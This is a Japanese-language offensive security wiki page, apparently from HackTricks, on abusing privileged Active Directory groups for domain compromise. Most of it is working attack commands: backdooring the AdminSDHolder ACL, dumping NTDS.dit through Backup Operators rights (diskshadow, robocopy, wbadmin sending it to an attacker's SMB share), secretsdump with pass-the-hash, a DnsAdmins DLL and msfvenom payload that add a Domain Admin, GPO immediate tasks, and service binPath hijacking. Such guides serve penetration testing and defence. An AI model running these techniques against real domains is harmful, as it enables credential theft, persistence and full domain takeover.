# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントやグループを作成する権限があります。さらに、Domain Controller（DC）へのローカルログインが可能になります。

このグループのメンバーを特定するには、次のコマンドを実行します：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DC へのローカルログインも可能です。<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** グループの Access Control List（ACL）は、high-privilege groups を含む Active Directory 内のすべての「protected groups」に対する権限を設定するため、非常に重要です。この仕組みにより、不正な変更を防止してこれらのグループのセキュリティを確保します。

攻撃者は、**AdminSDHolder** グループの ACL を変更し、standard user に完全な権限を付与することで、これを悪用できます。これにより、そのユーザーはすべての protected groups を完全に制御できるようになります。このユーザーの権限が変更または削除された場合でも、システムの設計により 1 時間以内に自動的に再付与されます。<sup>[[14]](#references)</sup>

最近の Windows Server documentation でも、複数の built-in operator groups は **protected** objects（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` など）として扱われています。**SDProp** process はデフォルトで 60 分ごとに **PDC Emulator** 上で実行され、`adminCount=1` を設定し、protected objects の inheritance を無効化します。これは persistence に役立つだけでなく、protected group から削除されたにもかかわらず、non-inheriting ACL を保持している stale privileged users の hunting にも役立ちます。<sup>[[12]](#references)</sup>

メンバーの確認と permissions の変更に使用する Commands は次のとおりです。
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復元プロセスを迅速化するための script が用意されています: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) を参照してください。<sup>[[14]](#references)</sup>

## AD Recycle Bin

この group のメンバーシップにより、削除された Active Directory objects を読み取れるため、sensitive information が明らかになる可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは、**以前の権限パスを復元する**のに役立ちます。削除されたオブジェクトには、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古い SPN、または別のオペレーターによって後から復元できる、削除された特権グループの DN が残っている場合があります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

DC 上のファイルへのアクセスは、ユーザーが `Server Operators` グループに所属していない限り制限されます。このグループに所属すると、アクセスレベルが変わります。

### Privilege Escalation

Sysinternals の `PsService` または `sc` を使用すると、service permissions を検査および変更できます。たとえば、`Server Operators` グループは特定の services を完全に制御できるため、任意の commands の実行と privilege escalation が可能になります。<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドにより、`Server Operators` が完全なアクセス権を持ち、サービスを操作して権限を昇格できることが明らかになります。

## Backup Operators

`Backup Operators` グループのメンバーシップにより、`SeBackup` および `SeRestore` 権限を利用して、`DC01` のファイルシステムにアクセスできます。これらの権限により、明示的なアクセス許可がなくても、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用してフォルダーの移動、一覧表示、ファイルのコピーが可能になります。このプロセスには、特定のスクリプトを使用する必要があります。<sup>[[1]](#references)</sup>

グループメンバーを一覧表示するには、次を実行します。
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

これらの privileges をローカルで活用するには、以下の手順を実行します。

1. 必要な libraries を import します:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して確認する：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする。例えば：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller の file system に直接 access できると、domain user と computer のすべての NTLM hash を含む `NTDS.dit` database を窃取できます。

#### Using diskshadow.exe

1. `C` drive の shadow copy を作成します：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
または、ファイルのコピーには `robocopy` を使用します：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュ取得のために `SYSTEM` と `SAM` を抽出:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべてのハッシュを取得する:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 抽出後: Pass-the-Hash で DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. 攻撃者マシン上の SMB server 用に NTFS filesystem をセットアップし、target machine 上に SMB credentials を cache します。
2. `wbadmin.exe` を使用して system backup と `NTDS.dit` extraction を行います。
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実践的なデモについては、[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) を参照してください。

## DnsAdmins

**DnsAdmins** group のメンバーは、その privileges を悪用して、DNS server 上で SYSTEM privileges を持つ arbitrary DLL を load できます。DNS server は多くの場合 Domain Controllers 上でホストされているため、この capability により大きな exploitation potential が生じます。

DnsAdmins group のメンバーを一覧表示するには、次を使用します：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意の DLL を実行する (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNS service（通常は DC 内）で SYSTEM 権限による任意のコード実行が可能になります。この問題は 2021 年に修正されました。

Members は、次のようなコマンドを使用して、DNS server に任意の DLL（ローカルまたは remote share から）を load させることができます：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLLをロードさせるには、DNSサービス（追加の権限が必要になる場合があります）を再起動する必要があります:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクトルの詳細については、ired.teamを参照してください。

#### Mimilib.dll

mimilib.dllを使用してコマンド実行を行うことも可能です。これを変更して、特定のコマンドやreverse shellを実行させます。詳細については[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を確認してください。<sup>[[15]](#references)</sup>

### MitM用のWPADレコード

DnsAdminsは、global query block listを無効化した後にWPADレコードを作成することで、DNSレコードを操作してMan-in-the-Middle (MitM)攻撃を実行できます。ResponderやInveighなどのツールを使用して、network trafficのspoofingおよびcaptureを行えます。

### Event Log Readers
メンバーはevent logsにアクセスでき、plaintext passwordsやcommand executionの詳細などの機密情報を発見できる可能性があります。
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトのDACLを変更でき、DCSync権限を付与できる可能性があります。このグループを悪用した権限昇格の手法については、Exchange-AD-Privesc GitHub repoで詳しく説明されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして行動できる場合、典型的な悪用方法は、攻撃者が制御する principal に [DCSync](dcsync.md) に必要な replication 権限を付与することです：
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** はメールボックスへのアクセス、強制的な Exchange 認証、LDAP relay を連鎖させ、この同じ primitive を実現していました。この relay path が緩和されている場合でも、`Exchange Windows Permissions` への直接的なメンバーシップや Exchange サーバーの制御は、ドメイン複製権限につながる high-value な経路として残ります。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V への完全なアクセス権を持っており、これを悪用して仮想化された Domain Controllers を制御できます。これには、稼働中の DC の clone 作成や、NTDS.dit ファイルからの NTLM hashes の抽出が含まれます。

### Exploitation Example

実際の abuse では通常、古い host-level LPE tricks ではなく、**DC のディスクや checkpoint への offline access** が用いられます。Hyper-V host にアクセスできる operator は、仮想化された Domain Controller の checkpoint を作成または export し、VHDX を mount して、guest 内の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の secrets を抽出できます。
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
From there, `Backup Operators` の workflow を再利用して、`Windows\NTDS\ntds.dit` と registry hives を offline でコピーします。

## Group Policy Creators Owners

この group のメンバーは、domain 内で Group Policies を作成できます。ただし、メンバーは users や groups に group policies を適用したり、既存の GPOs を編集したりすることはできません。

重要な点は、**creator が新しい GPO の owner になり**、通常はその後に編集するのに十分な権限を取得することです。つまり、次のいずれかが可能な場合、この group は興味深い対象になります。

- malicious GPO を作成し、admin を説得して target OU/domain に link させる
- 作成した GPO がすでに有用な場所に link されている場合、それを編集する
- GPOs を link できる別の delegated right を abuse し、この group で編集側の権限を得る

実際の abuse では通常、SYSVOL-backed policy files を通じて、**Immediate Task**、**startup script**、**local admin membership**、または **user rights assignment** の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` を通じて GPO を手動で編集する場合、変更だけでは不十分であることに注意してください。`versionNumber`、`GPT.ini`、場合によっては `gPCMachineExtensionNames` も更新する必要があります。更新しないと、クライアントはポリシーの更新を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** が導入されている環境では、**Organization Management** という特殊なグループが重要な権限を保持しています。このグループには、**ドメイン内のすべてのユーザーのメールボックスにアクセス**する権限があり、**'Microsoft Exchange Security Groups'** Organizational Unit (OU) を**完全に制御**できます。この制御対象には **`Exchange Windows Permissions`** グループも含まれており、権限昇格に悪用できます。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** グループのメンバーには、**`SeLoadDriverPrivilege`** などの複数の権限が付与されています。この権限により、**Domain Controller にローカルログオン**し、シャットダウンやプリンターの管理を行えます。これらの権限を悪用するには、特に非昇格コンテキストで **`SeLoadDriverPrivilege`** が表示されない場合、User Account Control (UAC) の bypass が必要です。<sup>[[1]](#references)</sup>

このグループのメンバーを一覧表示するには、次の PowerShell command を使用します：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Domain Controllers では、default Domain Controller Policy が **`SeLoadDriverPrivilege`** を `Print Operators` に付与するため、このグループは危険です。 このグループのメンバーの elevated token を取得できれば、privilege を有効化し、署名済みだが脆弱な driver を load して kernel/SYSTEM へ移行できます。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> token の処理に関する詳細は、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を確認してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC へのアクセス権が付与されます。これらのメンバーを列挙するには、PowerShell commands を使用できます：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDPのexploitに関するさらなる知見は、専用のpentestingリソースで確認できます。

#### リモート管理ユーザー

メンバーは **Windows Remote Management (WinRM)** 経由でPCにアクセスできます。これらのメンバーの列挙は、以下によって実行できます：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
WinRM に関連する exploitation techniques については、専用のドキュメントを参照してください。

#### Server Operators

このグループには、バックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンなど、Domain Controllers 上でさまざまな設定を実行する権限があります。<sup>[[1]](#references)</sup> メンバーを列挙するには、次のコマンドを使用します：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメイン コントローラーでは、`Server Operators` は一般的に、**サービスを再構成または開始/停止する権限**を十分に継承しており、デフォルトの DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **service-control abuse** と **NTDS extraction** の橋渡し役となります。
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
サービス ACL にこのグループの変更/開始権限がある場合、サービスを任意のコマンドを指すように設定し、`LocalSystem` として起動してから、元の `binPath` を復元します。サービス制御がロックダウンされている場合は、上記の `Backup Operators` techniques に切り替えて `NTDS.dit` をコピーします。

## 参考資料

- [1] [ired.team – 特権アカウントと Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions の悪用](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer's Guide](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の保護されたアカウントとグループ](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder を悪用および backdoor して Domain Admin の永続化を取得する方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory における昇格のための DnsAdmins Privilege の悪用](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
